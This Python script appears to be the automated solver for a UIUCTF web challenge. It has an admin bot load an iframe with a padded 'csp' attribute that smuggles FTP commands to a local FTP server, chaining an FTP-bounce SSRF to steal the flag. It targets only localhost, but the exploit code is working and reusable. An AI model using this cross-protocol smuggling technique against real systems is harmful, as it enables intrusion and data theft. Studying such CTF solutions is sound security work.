#!/usr/bin/env python3

from pwn import *
import requests
import os
import time

# each solve attempt takes ~15s tops?
# script must exit(1) on fail and exit(0) success
SITE_URL = "http://127.0.0.1:1337"
ADMIN_TOKEN = "6d1cbcc5a8c00e4ce2807ffc20963a0d"
FTP_PORT = 8021

# first test to make sure the webserver and ftp server is working
assert "uiuctf" in requests.get("http://127.0.0.1:1337/ssrf?healthcheck", headers={"Sec-Pro-Hacker": "1"}).text.strip()
ftpr = remote('127.0.0.1', FTP_PORT)
assert b"nodeftpd" in ftpr.recvline()
ftpr.close()

# == Register new user
USERNAME = os.urandom(10).hex()
PASSWORD = os.urandom(16).hex()
print("user", USERNAME, "pass", PASSWORD)
res = requests.post(f"{SITE_URL}/register", data={"username": USERNAME, "password": PASSWORD}, allow_redirects=False)
# uid=s%3Aeed5c3baf612489a56d91ec491608a44.cCryqY2WxTgqDbbcqVgUPVOd6ZP6F3N0Rmk%2Bm7K60s0; Path=/
cookie = res.headers["Set-Cookie"].split("=")[1].split(";")[0]
UID = cookie.split("%3A")[1].split(".")[0]
print("uid", UID)

def save_file(payload):
    r = requests.post(f"{SITE_URL}/save", cookies={"uid": cookie}, files={'file': ('file', payload)})
    assert "Saved" in r.text

def admin_bot():
    print(f"admin bot visiting http://127.0.0.1:1337/workspace/{UID}")
    r = requests.post(f"{SITE_URL}/report", headers={"X-ADMIN-TOKEN": ADMIN_TOKEN}, data={"url": f"http://127.0.0.1:1337/workspace/{UID}", "h-captcha-response": "x", "g-recaptcha-response": "x"})
    assert "Thanks" in r.text

framecsp = lambda url, csp: f"<iframe src='{url}' csp='{csp}'></iframe>"
gen_payload = lambda csp: framecsp(f"http://127.0.0.1:{FTP_PORT}/?csp", csp) 
pad = lambda x: x + " "*(65536 - len(x))

# == Payload1 - upload a HTTP request file
l = listen()
payload1_csp = "a" + " "*65536 + \
pad(f"USER {USERNAME}") + \
pad(f"PASS {PASSWORD}") + \
pad(f"EPRT |1|127.0.0.1|{l.lport}") + \
pad(f"STOR /files/{UID}/http_req.txt") + "X"

payload1_html = gen_payload(payload1_csp)
save_file(payload1_html)

# == Trigger the admin bot and upload our payload
admin_bot()
l.wait_for_connection()
# it needs to be moderately large so that we hit the race condition
l.send("GET /ssrf HTTP/1.0\nSec-Pro-Hacker: 1"+"\n"*1000000)
l.close()
print("file upload success!")

# == Payload2 - do the SSRF

payload2_csp = "a" + " "*65536 + \
pad(f"USER {USERNAME}") + \
pad(f"PASS {PASSWORD}") + \
pad(f"EPRT |1|127.0.0.1|1337") + \
pad(f"RETR /files/{UID}/http_req.txt") + \
pad(f"STOR /files/{UID}/flag.txt") + "X"

payload2_html = gen_payload(payload2_csp)
save_file(payload2_html)
admin_bot()
print("issued SSRF, waiting...")

time.sleep(5)

# == Payload3 - retrieve flag
l = listen()
payload3_csp = "a" + " "*65536 + \
pad(f"USER {USERNAME}") + \
pad(f"PASS {PASSWORD}") + \
pad(f"EPRT |1|127.0.0.1|{l.lport}") + \
pad(f"RETR /files/{UID}/flag.txt") + "X"


payload3_html = gen_payload(payload3_csp)
save_file(payload3_html)

admin_bot()
l.wait_for_connection()
SSRF_RESULT = l.recvall()
l.close()
print(SSRF_RESULT)
if b"uiuctf" in SSRF_RESULT:
    exit(0)
else:
    exit(1)
